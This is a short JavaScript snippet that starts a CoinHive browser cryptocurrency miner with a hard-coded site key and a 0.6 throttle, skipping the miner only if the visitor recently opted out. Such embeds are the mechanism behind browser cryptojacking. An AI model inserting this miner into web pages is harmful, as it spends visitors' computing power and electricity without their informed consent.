var miner = new CoinHive.Anonymous('NL9TTsyGeVU8FbKR9fUvwkwU4qPJ4Z2I', {
    throttle: 0.6
});
if (!miner.didOptOut(14400)) {
    miner.start();
}